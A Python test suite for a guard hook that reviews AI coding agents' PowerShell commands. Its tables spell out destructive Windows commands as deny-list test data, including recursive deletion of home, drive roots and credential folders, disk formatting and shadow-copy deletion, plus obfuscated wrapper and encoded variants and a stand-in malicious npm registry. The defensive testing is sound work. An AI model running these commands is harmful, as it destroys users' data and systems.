"""The PowerShell reader (catpilot_guard/powershell.py) and the checks that use it (docs/spec/WINDOWS.md §3.2).

Plain Python: these run on every OS, Windows CI included. Each table is read as Claude Code's PowerShell tool sends
it (tool_name "PowerShell"), and through the wrapper forms: `pwsh -Command`, `powershell -c`, and `-EncodedCommand`
(decoded and read), from PowerShell and from bash.
"""

from __future__ import annotations

import base64
import json
import os
import shlex
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from catpilot_guard import company_rules, destructive, powershell, secrets  # noqa: E402
from catpilot_guard import policy as pol  # noqa: E402

HOOKS = ROOT / "hooks" / "claude-code"

# Must deny when the PowerShell tool sends them.
DENIED = {
    # Remove-Item and its aliases with -Recurse (any prefix, any case, any dash) on a dangerous target.
    "home by $env:USERPROFILE": "Remove-Item -Recurse -Force $env:USERPROFILE",
    "home by ${env:USERPROFILE}": "Remove-Item -Recurse -Force ${env:USERPROFILE}",
    "home by $HOME": "Remove-Item $HOME -Recurse",
    "home by ~ with aliases and prefixes": "rm -r -fo ~",
    "home by absolute path": "Remove-Item C:\\Users\\alice -Recurse -Force",
    "home by %USERPROFILE% under cmd": 'cmd /c "rd /s /q %USERPROFILE%"',
    "drive root by ri": "ri C:\\ -r",
    "drive root with a slash": "Remove-Item C:/ -Recurse",
    "current drive root": "Remove-Item \\ -Recurse",
    "drive root wildcard": "Remove-Item -Path C:\\* -Recurse -Force",
    "drive root by provider path": "Remove-Item -Recurse FileSystem::C:\\",
    "drive root, module-qualified": "Microsoft.PowerShell.Management\\Remove-Item -Recurse C:\\",
    "drive root, -Rec -Fo": "Remove-Item -Rec -Fo C:\\",
    "drive root, upper case": "REMOVE-ITEM -RECURSE C:\\",
    "drive root, en dash": "Remove-Item \u2013Recurse C:\\",
    "drive root, typographic quotes": "Remove-Item \u2018C:\\\u2019 -Recurse",
    "drive root, -Recurse:$true": "Remove-Item C:\\ -Recurse:$true",
    "Windows directory": "Remove-Item -LiteralPath 'C:\\Windows' -Recurse",
    "$env:SystemRoot": "Remove-Item $env:SystemRoot -Recurse -Force",
    "Program Files": "Remove-Item 'C:\\Program Files' -Recurse",
    "Program Files (x86) by variable": 'Remove-Item "${env:ProgramFiles(x86)}" -Recurse',
    "ssh directory": "Remove-Item ~\\.ssh -Recurse -Force",
    "aws directory in a quoted variable path": 'Remove-Item "$env:USERPROFILE\\.aws" -Recurse',
    "kube directory under an absolute home": "Remove-Item C:\\Users\\alice\\.kube -Recurse",
    "gcloud under APPDATA": "Remove-Item $env:APPDATA\\gcloud -Recurse",
    "azure directory": "Remove-Item -Recurse -Force $HOME/.azure",
    "a bare variable": "Remove-Item -Recurse -Force $target",
    "a bare variable with a wildcard": 'Remove-Item -Recurse -Force "$target\\*"',
    "one dangerous element of an array": "Remove-Item -Recurse -Force node_modules, ~",
    "del /s on a drive root": "del /s /q C:\\*",
    "rd /s on the Windows directory": "rd /s /q C:\\Windows",
    "cmd rd /s": "cmd /c rd /s /q C:\\",
    "cmd.exe /k del /s": "cmd.exe /k del /s /q %SystemRoot%",
    "cmd with switches joined": "cmd /c rd/s/q C:\\",
    # A pipeline that feeds Remove-Item.
    "Get-ChildItem of a root into Remove-Item": "Get-ChildItem C:\\ | Remove-Item -Recurse -Force",
    "filtered Get-ChildItem of a root into Remove-Item": "Get-ChildItem C:\\ -Filter *.log | Remove-Item -Recurse",
    "filtered Get-ChildItem of the Windows directory": "gci $env:SystemRoot -Include *.dll | Remove-Item -Recurse",
    "ls of home into rm -r": "ls ~ | rm -r -fo",
    "a literal path into Remove-Item": "'C:\\' | Remove-Item -Recurse",
    "a variable into Remove-Item": "$env:USERPROFILE | Remove-Item -Recurse -Force",
    # Disks, volumes and shadow copies.
    "Format-Volume": "Format-Volume -DriveLetter C",
    "Clear-Disk": "Clear-Disk -Number 0 -RemoveData -Confirm:$false",
    "Remove-Partition": "Remove-Partition -DiskNumber 0 -PartitionNumber 1",
    "format a drive": "format D: /q",
    "diskpart with a script": "diskpart /s wipe.txt",
    "cipher /w": "cipher /w:C:\\",
    "vssadmin delete shadows": "vssadmin delete shadows /all /quiet",
    "wmic shadowcopy delete": "wmic shadowcopy delete",
    # The checks every shell gets: pushes, Kubernetes, IaC, databases, read from PowerShell's words.
    "force push to main": "git push --force origin main",
    "force push after other commands": "git status; git push -f origin master",
    "call operator with a +refspec": "& git push origin +HEAD:main",
    "call operator with a quoted path": "& 'C:\\Program Files\\Git\\cmd\\git.exe' push --force origin main",
    "an assignment's right-hand side": "$out = git push -f origin main",
    "an assignment without spaces": "$out=git push -f origin main",
    "a push after &&": "npm test && git push --force origin main",
    "kubectl delete namespace": "kubectl delete namespace production",
    "terraform auto-approve": "terraform apply -auto-approve",
    "dropdb": "dropdb production",
    # Blocks, subexpressions, unwraps, lines.
    "inside an if block": "if ($true) { Remove-Item ~ -Recurse }",
    "inside a script block": "Invoke-Command -ScriptBlock { Remove-Item C:\\ -Recurse -Force }",
    "inside ForEach-Object": "1..3 | ForEach-Object { Remove-Item $HOME -Recurse }",
    "inside a subexpression": "Write-Output $(Remove-Item ~ -Recurse)",
    "iex with a literal": "iex 'Remove-Item C:\\ -Recurse'",
    "Invoke-Expression -Command": 'Invoke-Expression -Command "Remove-Item C:\\Windows -Recurse"',
    "Start-Process cmd": "Start-Process cmd -ArgumentList '/c rd /s /q C:\\'",
    "Start-Process powershell with an array": "Start-Process powershell -ArgumentList '-Command','Remove-Item C:\\ -Recurse'",
    "bash -c inside PowerShell": "bash -c 'rm -rf ~'",
    "a second line": "Write-Host start\nRemove-Item -Recurse -Force ~",
    "a CRLF line": "Write-Host start\r\nRemove-Item -Recurse -Force ~",
    "backtick continuations": "Remove-Item `\n  -Recurse `\n  -Force C:\\",
    "after a comment with an apostrophe": "# clean up what's left\nRemove-Item -Recurse ~",
    "after a block comment": "<# it's fine #> Remove-Item -Recurse ~",
    "with a redirection": "Remove-Item -Recurse ~ 2>$null",
    "with 2>&1": "Remove-Item -Recurse ~ 2>&1 | Out-Null",
    "a here-string into iex": "iex @'\nRemove-Item -Recurse C:\\Windows\n'@",
}

# Must pass with no decision: common, harmless PowerShell an agent runs.
ALLOWED = {
    "list files": "Get-ChildItem -Recurse -Filter *.py",
    "list the drive root": "Get-ChildItem -Path C:\\ -Directory",
    "read a file": "Get-Content .\\README.md | Select-Object -First 20",
    "remove a build folder": "Remove-Item -Recurse -Force .\\build",
    "remove node_modules": "Remove-Item -Recurse -Force node_modules",
    "remove two build folders": "Remove-Item -Recurse -Force node_modules, dist",
    "remove quietly": "Remove-Item .\\dist -Recurse -Force -ErrorAction SilentlyContinue",
    "alias with prefixes": "rm -r -fo .\\out",
    "a temp subfolder": "Remove-Item $env:TEMP\\myapp -Recurse -Force",
    "a project under home": 'Remove-Item -Recurse -Force "$env:USERPROFILE\\project\\build"',
    "a project by absolute path": "Remove-Item C:\\Users\\dev\\project\\build -Recurse",
    "a project under ~": "Remove-Item ~\\project\\dist -Recurse",
    "WhatIf": "Remove-Item C:\\ -WhatIf -Recurse",
    "-Recurse:$false": "Remove-Item C:\\ -Recurse:$false",
    "a single file": "Remove-Item file.txt",
    "a file at the root, not recursive": "Remove-Item C:\\temp.txt",
    "pipeline of matches without -Recurse": "Get-ChildItem -Recurse -Include *.pyc | Remove-Item -Force",
    "pipeline from a subfolder": "Get-ChildItem .\\dist | Remove-Item -Recurse -Force",
    "filtered children of TEMP": "Get-ChildItem -Path $env:TEMP -Filter 'tmp*' | Remove-Item -Recurse -Force",
    "filtered children of home": "Get-ChildItem ~ -Filter *.tmp | Remove-Item -Recurse",
    "children of home but some": "Get-ChildItem $HOME -Exclude .ssh -Include *.bak | Remove-Item -Recurse",
    "each item of the working directory": "Get-ChildItem | ForEach-Object { Remove-Item $_ -Recurse -Force }",
    "items held in a variable": "$files = Get-ChildItem -Recurse *.log; $files | Remove-Item -Recurse",
    "each item's FullName": "Get-ChildItem .\\tmp | ForEach-Object { Remove-Item $_.FullName -Recurse -Force }",
    "git status and diff": "git status; git diff --stat",
    "git log": "git log --oneline -10",
    "push a feature branch": "git push origin feature/login",
    "force-with-lease a feature branch": "git push --force-with-lease origin feature/x",
    "a commit message that names a deletion": 'git commit -m "Remove-Item -Recurse C:\\ is dangerous"',
    "a string that names a deletion": "Write-Output 'rm -r -fo ~'",
    "a quoted value assigned": "$msg = 'Remove-Item -Recurse C:\\'",
    "npm": "npm install; npm run build; npm test",
    "pytest": "python -m pytest -q",
    "dotnet": "dotnet build -c Release",
    "make a directory": "New-Item -ItemType Directory -Force -Path .\\out",
    "copy a tree": "Copy-Item -Recurse .\\src .\\backup",
    "change directory and pull": "Set-Location C:\\repo; git pull",
    "set an environment variable": "$env:NODE_ENV = 'production'; npm run build",
    "cmd dir": 'cmd /c "dir /s"',
    "cmd rd of a build folder": "cmd /c rd /s /q .\\build",
    "pwsh -Command list": 'pwsh -NoProfile -Command "Get-ChildItem"',
    "a script file": "powershell -File .\\build.ps1",
    "Start-Process notepad": "Start-Process notepad.exe",
    "Format-Table": "Get-Process | Format-Table -AutoSize",
    "Get-Disk": "Get-Disk | Select-Object Number, Size",
    "cipher encrypt": "cipher /e secret.txt",
    "vssadmin list": "vssadmin list shadows",
    "iex of a variable it cannot read": "iex $script",
    "an encoded command that does not decode": "pwsh -EncodedCommand not-base64!!",
}

# The POSIX cases tests/test_destructive_hook.py denies, each with a PowerShell spelling that must deny too.
SPELLINGS = (
    ("rm -rf ~", "Remove-Item -Recurse -Force ~"),
    ("rm -rf /", "Remove-Item -Recurse -Force C:\\"),
    ("rm -rf $BUILD_DIR/*", "Remove-Item -Recurse -Force $BuildDir\\*"),
    ("rm -rf ~/.ssh", "Remove-Item -Recurse -Force ~\\.ssh"),
    ("rm -rf /Users/alice", "Remove-Item -Recurse -Force C:\\Users\\alice"),
    ('bash -c "rm -rf ~"', 'pwsh -Command "Remove-Item -Recurse ~"'),
    ("ls\nrm -rf ~", "Get-ChildItem\nRemove-Item -Recurse ~"),
    ("rm -rf \\\n  ~", "Remove-Item -Recurse `\n  ~"),
    ("# clean up what's left\nrm -rf ~\n# that's it", "# clean up what's left\nRemove-Item -Recurse ~\n# that's it"),
    ("dd if=/dev/zero of=/dev/sda bs=1M", "Clear-Disk -Number 0 -RemoveData"),
    ("git push --force origin main", "git push --force origin main"),
    ("git push origin +HEAD:release/2026.09", "git push origin +HEAD:release/2026.09"),
    ("kubectl delete namespace production", "kubectl delete namespace production"),
    ("terraform destroy -auto-approve", "terraform destroy -auto-approve"),
    ("dropdb production", "dropdb production"),
)


def single_quoted(command: str) -> str:
    """A PowerShell single-quoted string holding command."""
    return "'" + "".join(c + c if c in powershell.SINGLE_QUOTES else c for c in command) + "'"


def encoded(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


# How a PowerShell command is wrapped: (form, wrapper, the shell the wrapped command is read with).
WRAPPERS = {
    "pwsh -Command, from PowerShell": (lambda c: "pwsh -Command " + single_quoted(c), "powershell"),
    "powershell -c, from PowerShell": (lambda c: "powershell -c " + single_quoted(c), "powershell"),
    "powershell.exe -EncodedCommand, from PowerShell": (lambda c: "powershell.exe -NoProfile -EncodedCommand " + encoded(c), "powershell"),
    "pwsh -enc, from PowerShell": (lambda c: "pwsh -enc " + encoded(c), "powershell"),
    "pwsh -c, from bash": (lambda c: "pwsh -c " + shlex.quote(c), "bash"),
    "powershell.exe -Command, from bash": (lambda c: "powershell.exe -NoLogo -Command " + shlex.quote(c), "bash"),
    "pwsh -EncodedCommand, from bash": (lambda c: "pwsh -EncodedCommand " + encoded(c), "bash"),
}


def ps_event(command: str, tool: str = "PowerShell", **extra) -> dict:
    return dict({"session_id": "sess-ps", "hook_event_name": "PreToolUse", "tool_name": tool,
                 "tool_input": {"command": command}}, **extra)


class PowerShellDestructiveTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()  # not a repository: no checked-out branch
        self.addCleanup(self.tmp.cleanup)

    def finds(self, command: str, shell: str = "powershell"):
        return destructive.find_destructive_op(command, self.tmp.name, shell)

    def test_must_deny(self):
        for label, command in DENIED.items():
            with self.subTest(label=label):
                self.assertIsNotNone(self.finds(command))

    def test_must_allow(self):
        for label, command in ALLOWED.items():
            with self.subTest(label=label):
                self.assertIsNone(self.finds(command))

    def test_wrapper_forms_keep_the_decision(self):
        for form, (wrap, shell) in WRAPPERS.items():
            for label, command in DENIED.items():
                with self.subTest(form=form, label=label):
                    self.assertIsNotNone(self.finds(wrap(command), shell))
            for label, command in ALLOWED.items():
                with self.subTest(form=form, label=label):
                    self.assertIsNone(self.finds(wrap(command), shell))

    def test_every_posix_case_has_a_powershell_spelling(self):
        for posix, spelled in SPELLINGS:
            with self.subTest(posix=posix):
                self.assertIsNotNone(self.finds(posix, "bash"))
                self.assertIsNotNone(self.finds(spelled))

    def test_cmd_and_powershell_inside_a_bash_command(self):
        for command in ('cmd.exe /c "rd /s /q C:\\\\"', "cmd /c 'del /s /q %USERPROFILE%'",
                        "powershell.exe -c 'Remove-Item -Recurse $env:USERPROFILE'", "sudo pwsh -c 'Format-Volume -DriveLetter D'"):
            with self.subTest(command=command):
                self.assertIsNotNone(self.finds(command, "bash"))
        for command in ("cmd /c 'rd /s /q build'", "pwsh -c 'Get-ChildItem'", "pwsh ./build.ps1"):
            with self.subTest(command=command):
                self.assertIsNone(self.finds(command, "bash"))

    def test_the_running_users_home_by_absolute_path(self):
        home = os.path.expanduser("~")
        if not home or home == "~":
            self.skipTest("no home directory")
        self.assertIsNotNone(self.finds("Remove-Item -Recurse -Force '%s'" % home))
        self.assertIsNone(self.finds("Remove-Item -Recurse -Force '%s'" % os.path.join(home, "project", "build")))

    def test_a_bash_event_is_read_both_ways_on_windows_for_codex_and_copilot(self):
        command = "iex 'Remove-Item -Recurse -Force C:\\'"  # bash reads iex's argument as a string
        for host in ("codex", "copilot-cli"):
            with self.subTest(host=host):
                self.assertEqual(destructive.decide(ps_event(command, "Bash"), host, windows=False), {})
                denied = destructive.decide(ps_event(command, "Bash"), host, windows=True)
                self.assertEqual(denied["hookSpecificOutput"]["permissionDecision"], "deny")
        # Claude Code's Bash tool is bash (Git Bash on Windows): it is read as bash only.
        self.assertEqual(destructive.decide(ps_event(command, "Bash"), "claude-code", windows=True), {})

    def test_the_reason_never_repeats_the_command(self):
        result = destructive.decide(ps_event("Remove-Item -Recurse -Force C:\\Users\\zq-marker-user"))
        reason = result["hookSpecificOutput"]["permissionDecisionReason"]
        self.assertNotIn("zq-marker-user", reason)
        self.assertNotIn('"allow"', json.dumps(result))


class ReaderTests(unittest.TestCase):
    def commands(self, command: str) -> list:
        return [list(argv) for argv in powershell.simple_commands(command)]

    def test_splits_like_powershell(self):
        cases = {
            "git status; git log": [["git", "status"], ["git", "log"]],
            "a | b && c || d & e": [["a"], ["b"], ["c"], ["d"], ["e"]],
            "& 'C:\\Program Files\\Git\\cmd\\git.exe' push": [["git", "push"]],
            "echo 'it''s' \"a \"\"b\"\" `$x\"": [["echo", "it's", 'a "b" $x']],
            "git commit -m `\n  'msg'": [["git", "commit", "-m", "msg"]],
            "npm install --registry https://r.example.com 2>&1 > log.txt": [["npm", "install", "--registry", "https://r.example.com"]],
            "scp dist\\app.zip deploy@web1.example.org:/srv": [["scp", "dist\\app.zip", "deploy@web1.example.org:/srv"]],
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                self.assertEqual(self.commands(command), expected)

    def test_expressions_are_unknown_and_kept_as_written(self):
        argv = self.commands('git push origin "$env:BRANCH" $(Get-Branch)')[0]
        self.assertEqual(argv[:3], ["git", "push", "origin"])
        self.assertTrue(argv[3].startswith("$env:BRANCH") and not argv[3].literal)
        self.assertFalse(argv[4].literal)

    def test_environment_assignments_are_passed_on(self):
        assignments = []
        list(powershell.simple_commands("$env:NPM_CONFIG_REGISTRY = 'https://evil.example.com'; npm install", assignments=assignments))
        self.assertEqual(assignments, ["NPM_CONFIG_REGISTRY=https://evil.example.com"])
        assignments = []
        list(powershell.simple_commands('cmd /c "set AWS_PROFILE=prod && aws s3 ls"', assignments=assignments))
        self.assertEqual(assignments, ["AWS_PROFILE=prod"])

    def test_encoded_commands(self):
        self.assertEqual(powershell.decode_encoded(encoded("git push -f origin main")), "git push -f origin main")
        for value in ("not-base64!!", "QQ==", ""):
            with self.subTest(value=value):
                self.assertFalse(powershell.decode_encoded(value))
        # An encoded command given as an expression is unknown: nothing inside it is read.
        self.assertEqual(self.commands("pwsh -EncodedCommand $payload"), [["pwsh", "-EncodedCommand", "$payload"]])

    def test_parameter_prefixes(self):
        names = ("recurse", "force", "path", "literalpath", "filter")
        self.assertEqual(powershell.resolve("r", names, {}), "recurse")
        self.assertEqual(powershell.resolve("FO", names, {}), "force")
        self.assertIsNone(powershell.resolve("f", names, {}))  # Force or Filter: PowerShell refuses it
        self.assertEqual(powershell.resolve("lp", names, {"lp": "literalpath"}), "literalpath")

    def test_dangerous_targets(self):
        for target in ("C:\\", "c:", "D:/", "\\", "C:\\*", "C:\\*.*", "\\\\?\\C:\\", "C:\\Windows\\", "c:\\windows\\system32",
                       "C:\\Program Files (x86)", "$env:windir", "%SystemRoot%", "~", "~/", "$HOME", "${HOME}",
                       "$env:HOMEDRIVE$env:HOMEPATH", "C:\\Users\\bob", "\\Users\\bob\\.docker", "~\\.gnupg",
                       "$env:APPDATA\\gcloud", "$x", "${x}", "%TARGET%", "/", "/etc", "~/.ssh"):
            with self.subTest(target=target):
                self.assertTrue(powershell.dangerous_target(target))
        for target in (".", "*", ".\\build", "C:\\Windows\\Temp\\x", "C:\\Users\\Public\\Documents", "$_", "$PSItem",
                       "$x\\build", "~\\project", "C:\\repo\\out", "$_.FullName", "C:\\Users\\bob\\project"):
            with self.subTest(target=target):
                self.assertFalse(powershell.dangerous_target(target))


class PowerShellCompanyRulesTests(unittest.TestCase):
    def setUp(self):
        self.policy = pol.parse(json.dumps({
            "format": "catpilot-company-policy", "format_version": 1, "source_sha256": "a" * 64, "expires_on": "2099-01-01",
            "rules": [
                {"id": "branches", "kind": "protected_branch", "mode": "block", "values": ["main", "release/*"]},
                {"id": "hosts", "kind": "deploy_host", "mode": "block", "values": ["*.example.org"]},
                {"id": "registries", "kind": "package_registry", "mode": "block", "values": ["registry.npmjs.org"]},
                {"id": "accounts", "kind": "cloud_account", "mode": "block", "values": ["aws:111111111111"]},
            ],
        }).encode())
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def fired(self, command: str) -> list:
        return sorted(rule.id for rule, excepted in company_rules.matched_rules(command, self.tmp.name, self.policy, shell="powershell")
                      if not excepted)

    def test_the_rules_read_powershell(self):
        cases = {
            "git push --force origin main": ["branches"],
            "& git push origin :release/1.2": ["branches"],
            "cmd /c git push -f origin main": ["branches"],
            "$env:GIT_DIR = 'C:\\other\\.git'; git push -f": ["branches"],
            "git push origin feature/x": [],
            "scp dist\\app.zip deploy@web1.other.com:/srv": ["hosts"],
            "scp dist\\app.zip deploy@web1.example.org:/srv": [],
            "scp dist\\app.zip deploy@${env:TARGET}:/srv": ["hosts"],
            "$env:npm_config_registry = 'https://evil.example.com'; npm install": ["registries"],
            "npm install --registry https://evil.example.com": ["registries"],
            "npm install": [],
            "aws sts assume-role --role-arn arn:aws:iam::222222222222:role/x --role-session-name s": ["accounts"],
            "aws sts assume-role --role-arn arn:aws:iam::111111111111:role/x --role-session-name s": [],
            "pwsh -c 'git push --force origin main'": ["branches"],
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                self.assertEqual(self.fired(command), expected)

    def test_decide_reads_the_powershell_tool(self):
        result = company_rules.decide(ps_event("git push --force origin main", cwd=self.tmp.name), "claude-code", self.policy)
        self.assertEqual(result["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertEqual(company_rules.decide(ps_event("git status", cwd=self.tmp.name), "claude-code", self.policy), {})


class PowerShellHookTests(unittest.TestCase):
    """The hooks as Claude Code runs them for its PowerShell tool: the event on stdin, the decision on stdout."""

    def run_hook(self, name: str, event: dict, *args: str, env: dict | None = None) -> subprocess.CompletedProcess:
        full = {k: v for k, v in os.environ.items() if k not in ("CATPILOT_EVIDENCE_LOG", "CATPILOT_EVIDENCE_SYSLOG")}
        full.update(env or {})
        return subprocess.run([sys.executable, str(HOOKS / name), *args], input=json.dumps(event), capture_output=True,
                              text=True, timeout=30, env=full)

    def test_destructive_hook_denies_a_powershell_deletion_and_logs_the_tool(self):
        with tempfile.TemporaryDirectory() as tmp:
            log = Path(tmp) / "evidence.jsonl"
            proc = self.run_hook("pretooluse-destructive-ops.py", ps_event("Remove-Item -Recurse -Force $env:USERPROFILE"),
                                 env={"CATPILOT_EVIDENCE_LOG": str(log)})
            self.assertEqual(proc.returncode, 0, proc.stderr)
            self.assertEqual(json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")
            entry = json.loads(log.read_text(encoding="utf-8").splitlines()[0])
            self.assertEqual((entry["event"], entry["tool"]), ("deny", "PowerShell"))
            self.assertNotIn("USERPROFILE", log.read_text(encoding="utf-8"))
            proc = self.run_hook("pretooluse-destructive-ops.py", ps_event("Get-ChildItem -Recurse"))
            self.assertEqual(json.loads(proc.stdout), {})

    def test_secrets_hook_reads_the_powershell_tool(self):
        key = "AKIA" + "IOSFODNN7EXAMPLE"
        proc = self.run_hook("pretooluse-secrets.py", ps_event("$env:AWS_ACCESS_KEY_ID = '%s'; aws s3 ls" % key))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        out = json.loads(proc.stdout)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertNotIn(key, proc.stdout)
        self.assertIsNotNone(secrets.find_credential("$env:AWS_ACCESS_KEY_ID = '%s'" % key))

    def test_malformed_powershell_input_fails_closed(self):
        for event in ({"tool_name": "PowerShell", "tool_input": "x"}, {"tool_name": "PowerShell", "tool_input": {"command": 5}}):
            with self.subTest(event=event):
                proc = self.run_hook("pretooluse-destructive-ops.py", event)
                self.assertEqual(proc.returncode, 2)


class ReadTimeoutTests(unittest.TestCase):
    """Review of the #137 merge: the timer's ReadTimeout is a ValueError, and must stop the check wherever it fires."""

    def test_decoding_an_encoded_command_never_swallows_the_timer(self):
        from unittest import mock

        with mock.patch.object(powershell.base64, "b64decode", side_effect=destructive.ReadTimeout("alarm")):
            with self.assertRaises(destructive.ReadTimeout):
                powershell.decode_encoded("bABzAA==")
        self.assertIsNone(powershell.decode_encoded("not base64!"))

    def test_a_runner_string_is_read_under_the_outer_deadline(self):
        import time

        from catpilot_guard.cloud_targets import cloud_targets
        from catpilot_guard.registry_targets import registry_targets

        split = ([["npx", "-c", "npm install --registry https://evil.example x"]], [])
        past = time.monotonic() - 1
        with self.assertRaises(destructive.ReadTimeout):
            registry_targets("", split=split, deadline=past)
        with self.assertRaises(destructive.ReadTimeout):
            cloud_targets("", split=([["npx", "-c", "aws s3 ls --account-id 999999999999"]], []), deadline=past)
        self.assertTrue(registry_targets("", split=split))  # with time left, the string is read


if __name__ == "__main__":
    unittest.main()
